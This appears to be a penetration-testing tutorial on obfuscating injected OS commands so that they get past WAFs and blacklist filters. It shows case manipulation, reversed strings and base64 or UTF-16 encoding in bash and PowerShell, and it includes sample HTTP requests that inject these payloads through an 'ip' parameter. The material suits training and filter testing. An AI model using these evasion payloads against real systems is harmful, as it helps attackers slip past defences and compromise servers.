In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.

While the following techniques can work, it is still a good idea to be creative with Bash and Powershell to create your own unique obfuscation methods. This way, it is much less likely for the payload to be denied by a filter or a WAF.
## Case Manipulation
One command obfuscation technique we can use is case manipulation, in which the character cases of a command is inverted (e.g `WHOAMI`) or alternated (e.g `WhOaMi`). This usually works because command blacklist functions may not check for different case variations of a single word, this is because Linux-based systems are case sensitive. So this technique will work for Windows' Powershell and CMD as they are case-insensitive.

Not all is lost for Linux-based systems and bash shell, we just have to be creative:
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
The command above will convert the command into an all-lowercase word and execute it.

Additionally, for bash shell, the following technique will work as well:
```bash
$(a="WhOaMi";printf %s "${a,,}")
```
## Reversed Commands
Another technique is reversing commands, and having a command template that switches them back and executes the command. For example, instead of executing `whoami`, we will instead use `imaohw` to avoid triggering the blacklisted command.

But first, we have to get the reversed string of our command in our terminal:
```bash
echo 'whoami' | rev
```
Then we can execute the original command by reversing it back in a sub-shell:
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%0d%0a$(rev<<<'imaohw')
```

The same can also be applied to Windows. First we reverse the string:
```powershell
"whoami"[-1...20] -join ''
```
Then we execute a reverse string using Powershell sub-shell (`iex "$()"`):
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%0d%0aiex "$('imaohw'[-1..-20] -join '')"
```
> Note: We removed the encoding on the command so that we can read it properly. But during engagements, make sure to encode the necessary characters to bypass other filters.
## Encoded Commands
Another technique is encoding commands, this may be helpful for commands containing filtered characters or characters that may be URL-decoded by the server. However, this may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute (avoid this by not using encoded characters).

In this case, we can utilize various tools such as `base64` for base64 encoding and `xxd` for hex encoding. For example:
```bash
echo "whoami" | base64
```
Which will return `d2hvYW1pCg==`. We can now create a command to decode the encoded string in a sub-shell and then pass it to bash to be executed:
```bash
bash<<<$(base64 -d<<<d2hvYW1pCg==)
```
Which we can then use as a payload:
```http
POST / HTTP/1.1
Host: target-website.com
...

ip=127.0.0.1%0d%0abash<<<$(base64%09-d<<<d2hvYW1pCg==)
```
>   Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character. 

This encoding technique can also be used in Windows environment by using the following command:
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```
The command above can also be done in a Linux environment, by first converting the string from `utf-8` to `utf-16`:
```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

We can then decode the base64-encoded string and execute it with a Powershell sub-shell (`iex "$()"`):
```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
## Automating Evasion/Bypass
When dealing with advanced security tools, it may be hard to use basic, manual obfuscation methods. In such cases, it's wise to resort to automated obfuscation tools, such as [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) for Linux and [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) for Windows.